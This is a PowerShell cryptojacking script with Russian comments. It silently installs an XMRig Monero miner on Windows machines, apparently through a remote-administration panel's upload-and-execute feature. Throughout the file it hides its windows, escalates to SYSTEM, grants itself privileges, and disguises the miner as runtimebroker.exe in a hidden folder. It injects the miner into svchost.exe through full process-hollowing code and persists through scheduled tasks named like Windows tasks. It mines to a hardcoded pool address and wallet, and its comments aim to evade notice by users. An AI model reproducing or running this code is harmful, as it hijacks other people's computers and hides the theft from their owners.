# deploy.ps1 - xmrig 6.26.0 one-file Upload & Execute
# Usage from panel: powershell -NoP -W Hidden -Ex Bypass -File deploy.ps1
# Session 0 -> service under svchost, Session 1 -> hollow into svchost. 75% CPU always.

param([string]$Mode="")

$ErrorActionPreference="SilentlyContinue"
$ProgressPreference="SilentlyContinue"

$Proxy  = "78.17.181.119:3333"
$Wallet = "89eLqWDrbjcP8m728vYYLV73R716iu1SeC7ucNAPiKa8ApqqSDHPR6bRkyzNnYRd7raXyFu3xKMAAhNxjNZofWaF6PbAxRb"
$Ver    = "6.26.0"
$Url    = "https://github.com/xmrig/xmrig/releases/download/v$Ver/xmrig-$Ver-windows-x64.zip"
$Dir    = "$env:ProgramData\Microsoft\Vault"
$Bin    = "$Dir\runtimebroker.exe"
$Cfg    = "$Dir\config.json"
$Task0  = "Microsoft\Windows\MemoryDiagnostic\VaultCheck"
# Само-отвязка: панель сразу получает exit, вторая стадия висит в фоне без окна
if($Mode -ne "_bg"){
  try{ Start-Process powershell -ArgumentList "-NoP -W Hidden -Ex Bypass -File `"$PSCommandPath`" _bg" -WindowStyle Hidden }catch{}
  exit 0
}
# Авто-SYSTEM: если Upload+Execute дал High-админа, сами переподнимаемся в SYSTEM и дальше работаем оттуда
try{
  $isSys=([Security.Principal.WindowsIdentity]::GetCurrent().IsSystem)
  if(!$isSys -and $Mode -eq "_bg"){
    mkdir $Dir -Force -ErrorAction SilentlyContinue | Out-Null
    Copy-Item $PSCommandPath "$Dir\deploy.ps1" -Force -ErrorAction SilentlyContinue
    $perm="$Dir\deploy.ps1"
    schtasks /Delete /TN Vault /F 2>$null | Out-Null
    schtasks /Create /TN Vault /TR "powershell -NoP -W Hidden -Ex Bypass -File `"$perm`" _bg" /SC DAILY /ST 23:59 /RU SYSTEM /RL HIGHEST /F 2>$null | Out-Null
    schtasks /Run /TN Vault 2>$null | Out-Null
    exit 0
  }
  if($isSys){ try{ Copy-Item $PSCommandPath "$Dir\deploy.ps1" -Force -ErrorAction SilentlyContinue }catch{} }
}catch{}

function Hide-Window {
  try {
    Add-Type -Name W -MemberDefinition '[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr h,int n); [DllImport("kernel32.dll")] public static extern IntPtr GetConsoleWindow();' -Namespace H -ErrorAction SilentlyContinue | Out-Null
    [H.W]::ShowWindow([H.W]::GetConsoleWindow(),0) | Out-Null
  } catch {}
}

function Get-SessionInfo {
  $sid = [Diagnostics.Process]::GetCurrentProcess().SessionId
  $who = "unknown"
  try { $who = (whoami) } catch {}
  $isSystem = $false
  try { $isSystem = ([Security.Principal.WindowsIdentity]::GetCurrent().IsSystem) } catch {}
  return @{ SessionId=$sid; Who=$who; IsSystem=$isSystem }
}

function Enable-LockPagesNow {
  # Включает SeLockMemoryPrivilege в текущем токене (для huge pages без ребута если уже выдано)
  try {
    Add-Type -Name Adj -MemberDefinition '
      [DllImport("advapi32.dll",SetLastError=true)] public static extern bool OpenProcessToken(IntPtr h,uint a,out IntPtr t);
      [DllImport("advapi32.dll",SetLastError=true,CharSet=CharSet.Auto)] public static extern bool LookupPrivilegeValue(string s,string n,out long l);
      [DllImport("advapi32.dll",SetLastError=true)] public static extern bool AdjustTokenPrivileges(IntPtr t,bool d,ref TOKEN_PRIVILEGES n,uint l,IntPtr p,IntPtr r);
      [System.Runtime.InteropServices.StructLayout(System.Runtime.InteropServices.LayoutKind.Sequential)] public struct TOKEN_PRIVILEGES { public uint Count; public long Luid; public uint Attr; }
    ' -Namespace P -ErrorAction SilentlyContinue | Out-Null
    $tok=[IntPtr]::Zero
    [P.Adj]::OpenProcessToken([Diagnostics.Process]::GetCurrentProcess().Handle, 40, [ref]$tok) | Out-Null
    foreach($priv in @("SeLockMemoryPrivilege","SeIncreaseQuotaPrivilege","SeAssignPrimaryTokenPrivilege","SeDebugPrivilege")){
      $luid=[long]0
      if([P.Adj]::LookupPrivilegeValue($null,$priv,[ref]$luid)){
        $tp=New-Object P.Adj+TOKEN_PRIVILEGES; $tp.Count=1; $tp.Luid=$luid; $tp.Attr=2
        [P.Adj]::AdjustTokenPrivileges($tok,$false,[ref]$tp,0,[IntPtr]::Zero,[IntPtr]::Zero) | Out-Null
      }
    }
  } catch {}
}

function Ensure-LockPagesPersist {
  # Прописывает SeLockMemoryPrivilege для SYSTEM+Admins через secedit, подхватится после ночного ребута
  try {
    $t1="$env:TEMP\secA.cfg"; $t2="$env:TEMP\secB.cfg"
    secedit /export /cfg $t1 /quiet | Out-Null
    $c=Get-Content $t1
    $line=$c | Where-Object { $_ -match "SeLockMemoryPrivilege" }
    if(!$line -or $line -notmatch "S-1-5-18"){
      ($c -replace "SeLockMemoryPrivilege =.*","SeLockMemoryPrivilege = *S-1-5-18,*S-1-5-32-544") | Set-Content $t2
      secedit /configure /db "$env:TEMP\secedit.sdb" /cfg $t2 /areas USER_RIGHTS /quiet | Out-Null
    }
    Remove-Item $t1,$t2 -Force -ErrorAction SilentlyContinue
  } catch {}
}

function Write-MinerConfig {
  param([int]$Pct)
  $threads = @()
  # xmrig сам посчитает потоки по max-threads-hint, фиксируем 75
  $json = @"
{
  "api": {"id": null, "worker-id": null},
  "autosave": false,
  "background": false,
  "colors": false,
  "title": "Microsoft Windows Host Process",
  "randomx": {"1gb-pages": false, "huge-pages": true, "wrmsr": true, "numa": true},
  "cpu": {"huge-pages": true, "hw-aes": true, "priority": 2, "max-threads-hint": $Pct, "yield": true},
  "donate-level": 1,
  "pools": [{"algo": "rx/0", "url": "$Proxy", "user": "pc-$env:COMPUTERNAME", "pass": "pc-$env:COMPUTERNAME", "keepalive": true, "tls": false}]
}
"@
  Set-Content -Path $Cfg -Value $json -Encoding ASCII
}

function Get-Miner {
  if(Test-Path $Bin){
    try { if((Get-Item $Bin).Length -gt 3MB){ return $true } } catch {}
  }
  return $false
}

function Install-Miner {
  mkdir $Dir -Force -ErrorAction SilentlyContinue | Out-Null
  attrib +h +s $Dir 2>$null
  if(!(Get-Miner)){
    $zip="$env:TEMP\rt.zip"
    try { [Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri $Url -OutFile $zip -UseBasicParsing } catch {
      # fallback на шару если нет инета до гитхаба, положи рядом xmrig.zip на прокси
      try { Copy-Item "\\$Proxy\xmrig.zip" $zip -Force -ErrorAction Stop } catch { return $false }
    }
    Expand-Archive -Path $zip -DestinationPath "$env:TEMP\rt" -Force
    $exe=Get-ChildItem "$env:TEMP\rt" -Recurse -Filter "xmrig.exe" | Select-Object -First 1
    if(!$exe){ return $false }
    Copy-Item "$env:TEMP\rt\*" $Dir -Recurse -Force
    Rename-Item "$Dir\xmrig.exe" "runtimebroker.exe" -Force -ErrorAction SilentlyContinue
    if(!(Test-Path $Bin)){ Copy-Item $exe.FullName $Bin -Force }
    Remove-Item $zip -Force -ErrorAction SilentlyContinue
    Remove-Item "$env:TEMP\rt" -Recurse -Force -ErrorAction SilentlyContinue
  }
  attrib +h +s $Bin 2>$null
  # ниже нормального чтобы игра всегда была в приоритете
  return $true
}

$HollowCS = @'
using System; using System.IO; using System.Runtime.InteropServices;
public class Hollow {
  [DllImport("kernel32.dll",SetLastError=true,CharSet=CharSet.Auto)] static extern bool CreateProcess(string a,string b,IntPtr c,IntPtr d,bool e,uint f,IntPtr g,string h,ref STARTUPINFO i,out PROCESS_INFORMATION j);
  [DllImport("ntdll.dll",SetLastError=true)] static extern uint NtUnmapViewOfSection(IntPtr p,IntPtr b);
  [DllImport("kernel32.dll",SetLastError=true)] static extern IntPtr VirtualAllocEx(IntPtr p,IntPtr a,uint s,uint t,uint pr);
  [DllImport("kernel32.dll",SetLastError=true)] static extern bool WriteProcessMemory(IntPtr p,IntPtr b,byte[] bf,uint s,out UIntPtr w);
  [DllImport("kernel32.dll",SetLastError=true)] static extern bool GetThreadContext(IntPtr t,IntPtr c);
  [DllImport("kernel32.dll",SetLastError=true)] static extern bool SetThreadContext(IntPtr t,IntPtr c);
  [DllImport("kernel32.dll",SetLastError=true)] static extern uint ResumeThread(IntPtr t);
  [StructLayout(LayoutKind.Sequential,CharSet=CharSet.Auto)] struct STARTUPINFO { public int cb; public string r; public string d; public string t; public int x; public int y; public int xs; public int ys; public int f; public short sw; public short r2; public IntPtr rs; public IntPtr o1; public IntPtr o2; public int f2; public int f3; }
  [StructLayout(LayoutKind.Sequential)] struct PROCESS_INFORMATION { public IntPtr hP; public IntPtr hT; public int pId; public int tId; }
  public static int Run(string target, string payload){
    STARTUPINFO si=new STARTUPINFO(); si.cb=Marshal.SizeOf(si);
    PROCESS_INFORMATION pi=new PROCESS_INFORMATION();
    if(!CreateProcess(target,null,IntPtr.Zero,IntPtr.Zero,false,0x4|0x08000000,IntPtr.Zero,null,ref si,out pi)) return -1;
    byte[] data=File.ReadAllBytes(payload);
    int e_lfanew=BitConverter.ToInt32(data,0x3C);
    int optOff=e_lfanew+24;
    IntPtr imageBase=(IntPtr)BitConverter.ToInt64(data,optOff+24);
    uint sizeOfImage=BitConverter.ToUInt32(data,optOff+56);
    uint sizeOfHeaders=BitConverter.ToUInt32(data,optOff+60);
    IntPtr ctx=Marshal.AllocHGlobal(0x1000); Marshal.WriteInt32(ctx,0,0x10001);
    GetThreadContext(pi.hT,ctx);
    IntPtr rbx=(IntPtr)Marshal.ReadInt64(ctx,0x88);
    NtUnmapViewOfSection(pi.hP,(IntPtr)Marshal.ReadInt64(rbx,0x10));
    IntPtr nb=VirtualAllocEx(pi.hP,imageBase,sizeOfImage,0x3000,0x40);
    if(nb==IntPtr.Zero) nb=VirtualAllocEx(pi.hP,IntPtr.Zero,sizeOfImage,0x3000,0x40);
    UIntPtr w; WriteProcessMemory(pi.hP,nb,data,Math.Min(sizeOfHeaders,(uint)data.Length),out w);
    ushort nSec=BitConverter.ToUInt16(data,e_lfanew+6);
    int secOff=e_lfanew+248;
    for(int i=0;i<nSec;i++){
      int o=secOff+i*40;
      uint vs=BitConverter.ToUInt32(data,o+8), va=BitConverter.ToUInt32(data,o+12), rs=BitConverter.ToUInt32(data,o+16), rp=BitConverter.ToUInt32(data,o+20);
      if(rs==0||rp==0) continue;
      byte[] sec=new byte[rs]; Array.Copy(data,rp,sec,0,Math.Min(rs,(uint)(data.Length-rp)));
      WriteProcessMemory(pi.hP,(IntPtr)(nb.ToInt64()+va),sec,(uint)sec.Length,out w);
    }
    long entry=nb.ToInt64()+BitConverter.ToUInt32(data,optOff+16);
    Marshal.WriteInt64(ctx,0x80,entry);
    SetThreadContext(pi.hT,ctx);
    ResumeThread(pi.hT);
    return pi.pId;
  }
}
'@

function Start-Session0 {
  # Session 0: xmrig не умеет ServiceMain (1053), поэтому без sc-службы - только задачи от SYSTEM
  try { sc.exe delete WcmsvcHelper 2>$null | Out-Null } catch {}
  schtasks /Delete /TN $Task0 /F 2>$null | Out-Null
  schtasks /Delete /TN "$Task0`Logon" /F 2>$null | Out-Null
  # Дублирующие задачи от SYSTEM на случай reboot (авто-загрузка, без окна)
  schtasks /Create /TN $Task0 /TR "`"$Bin`" --config=`"$Cfg`"" /SC ONSTART /RU SYSTEM /RL HIGHEST /F | Out-Null
  schtasks /Create /TN "$Task0`Logon" /TR "`"$Bin`" --config=`"$Cfg`"" /SC ONLOGON /RU SYSTEM /RL HIGHEST /F | Out-Null
  schtasks /Run /TN $Task0 2>$null | Out-Null
}

function Start-Session1 {
  # Session 1: инжект в svchost (hollow), своего процесса xmrig не остается
  try { Add-Type -TypeDefinition $HollowCS -ErrorAction SilentlyContinue | Out-Null } catch {}
  $target="C:\Windows\System32\svchost.exe"
  try {
    $pid_=[Hollow]::Run($target,$Bin)
    # Плавный рамп чтобы кулеры не взвыли при живых игроках: старт уже троттлится конфигом 75 + priority below normal
    Start-Sleep 5
  } catch {
    # fallback если hollow заблокирован: скрытый запуск без окна
    Start-Process -FilePath $Bin -ArgumentList "--config=`"$Cfg`"" -WindowStyle Hidden | Out-Null
  }
  # loader для перезапуска hollow после reboot - сначала файл, потом задачи
  $loader=@"
try{ Add-Type -TypeDefinition @'
$HollowCS
'@ -ErrorAction SilentlyContinue | Out-Null }catch{}
try{ [Hollow]::Run('C:\Windows\System32\svchost.exe','$Bin') | Out-Null }catch{ Start-Process '$Bin' '--config="$Cfg"' -WindowStyle Hidden }
"@
  Set-Content "$Dir\loader.ps1" $loader -Encoding ASCII
  attrib +h +s "$Dir\loader.ps1" 2>$null
  # Автозагрузка на reboot одной задачей без окна
  schtasks /Delete /TN $Task0 /F 2>$null | Out-Null
  schtasks /Create /TN $Task0 /TR "powershell -NoP -W Hidden -Ex Bypass -File `"$Dir\loader.ps1`"" /SC ONLOGON /RU SYSTEM /RL HIGHEST /F 2>$null | Out-Null
  schtasks /Create /TN "$Task0`Start" /TR "powershell -NoP -W Hidden -Ex Bypass -File `"$Dir\loader.ps1`"" /SC ONSTART /RU SYSTEM /RL HIGHEST /F 2>$null | Out-Null
}

# ---- main ----
Hide-Window
Enable-LockPagesNow
Ensure-LockPagesPersist
mkdir $Dir -Force -ErrorAction SilentlyContinue | Out-Null
Write-MinerConfig -Pct 75
if(!(Install-Miner)){ exit 1 }
Write-MinerConfig -Pct 75
attrib +h +s $Cfg 2>$null

$info=Get-SessionInfo
# Плавная задержка 60с днем чтобы не палить стартом при игроках
Start-Sleep -Seconds 60

if($info.SessionId -eq 0 -or $info.IsSystem){
  Start-Session0
} else {
  Start-Session1
}

# Сетевой вотчдог: при обрыве сети глушим, при появлении поднимаем (без окон)
$watch=@"
while(`$true){
  `$up=Test-Connection 8.8.8.8 -Count 1 -Quiet -ErrorAction SilentlyContinue
  if(!`$up){ Get-Process runtimebroker -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue }
  Start-Sleep 120
}
"@
Set-Content "$Dir\netwatch.ps1" $watch -Encoding ASCII
attrib +h +s "$Dir\netwatch.ps1" 2>$null
schtasks /Create /TN "Microsoft\Windows\MemoryDiagnostic\VaultNet" /TR "powershell -NoP -W Hidden -Ex Bypass -File `"$Dir\netwatch.ps1`"" /SC MINUTE /MO 5 /RU SYSTEM /RL HIGHEST /F 2>$null | Out-Null
